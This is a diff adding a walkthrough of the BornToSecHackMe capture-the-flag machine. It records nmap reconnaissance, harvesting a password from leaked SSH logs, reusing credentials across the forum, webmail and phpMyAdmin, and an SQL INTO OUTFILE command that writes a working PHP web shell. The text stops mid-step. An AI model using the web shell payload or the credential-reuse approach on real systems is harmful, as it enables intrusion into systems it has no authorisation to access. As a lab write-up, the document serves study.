@@ -1,17 +1,129 @@
 # Method 1
 
-## IP Discovering
+## Target Identification
 
 As we don't know the ip we need to scan the local network to know which host are presents
 
 To do so we'll use nmap
 
 ```bash
-sudo nmap -A 192.168.56.0/24
+sudo nmap -A 192.168.42.0/24
 ```
 
-and we get this output
+and we get an output like this
 
 ```
+Nmap scan report for 192.168.42.1
+Host is up (0.00038s latency).
+MAC Address: 1A:7E:B9:60:5D:64 (Unknown)
+```
+
+In order to make sure this is the good VM we will shutdown the vm and proceed again
+
+## Information gathering
+
+### Service Discovery
+Now we can start digging into the machine itself to list the services and their versions
+We will use nmap with the `-A` flag: `sudo nmap -A 192.168.42.1`
 
 ```
+PORT    STATE SERVICE  VERSION
+21/tcp  open  ftp      vsftpd 2.0.8 or later
+22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
+143/tcp open  imap     Dovecot imapd
+443/tcp open  ssl/http Apache httpd 2.2.22
+993/tcp open  ssl/imap Dovecot imapd
+```
+
+So we know there's:
+- An FTP Server running `vsftpd 2.0.8 or later`
+- An SSH access through port `22`
+- A webserver **Apache 2.2.22** listening on ports `80` and `443`
+- An imap service listening on port `143` and `993`
+
+#### Web Server
+
+- Trying to connect to port `80` we got a page saying 'hack me'
+- Trying to connect to port `443` we got an error `404`, ie page not found
+
+- To not go blindly we will use nmap performing a scan on both `80` and `443`
+- The scan gives the following results:
+> `nmap --script=http-enum "192.168.42.2"`
+```
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 15:21 EDT
+Nmap scan report for 192.168.42.2
+Host is up (0.00085s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+143/tcp open  imap
+443/tcp open  https
+| http-enum:
+|   /forum/: Forum
+|   /phpmyadmin/: phpMyAdmin
+|   /webmail/src/login.php: squirrelmail version 1.4.22
+|_  /webmail/images/sm_logo.png: SquirrelMail
+993/tcp open  imaps
+MAC Address: 08:00:27:93:02:30 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 41.34 seconds
+```
+
+We will start by `/forum/
+On this page we can see diffeent post including one talking about login problems
+When we access it we find a lot of connexion logs
+> Thoses logs are generated after login attempts, it seems from ssh
+>
+> we can see a lot of them that fail giving us the user name that tried to enter
+>
+> `Failed password for invalid user admin from 104.245.98.119`
+
+> Performing a search for this pattern in the feed, we realize in some attempts the user name looks more like a password than a username
+> 
+> For example:
+>
+>`Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`
+
+> Right after this line we can see a succesful login attemp for the user `lmezard`
+>
+> `Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)`
+
+So we will try to login with this credentials pair to login
+> It doesn't work to login through ssh neither through display
+>
+> We will try them as well in phpmyadmin and webmail but doesn't work either
+>
+> Then we will try to login in the forum, it works !
+
+#### Investigating lmezard
+> Once connected on the forum we want more info about lmezard so we click on the username in the menu
+>
+- We got an email address for `lmezard` `laurie@borntosec.net`
+> When investigating on someone the most senistive point is the mailbox
+- We will try to login with the email we found and the only password we know `/webmail/src/login.php`
+> Most of users use the same password in different websites, in this case this worked out for us !
+
+- In the mailbox we can find two mails, one not interesting at all and another one named `DB Access`
+> This one may contain credentials
+- In this mail we got a username and a password to access the database:
+```
+Hey Laurie,
+
+You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+
+Best regards.
+```
+With this credentials we can connect to phpmyadmin
+
+#### phpmyadmin
+
+> Once connected we will try to create a reverse shell with this command: `SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET[\'cmd\']) {system($_GET[\'cmd\']);} ?></pre></BODY></HTML>" into outfile "/path/backdoor.php"`
+
+We create a new database from where we can run SQL commands in order to crete a file, each try gives us an error message for missing permissions
+
+Using dirbuster (takes a lot of time) we found a list of directory, trying them all one is writable: `/forum/templates_c'
+
+
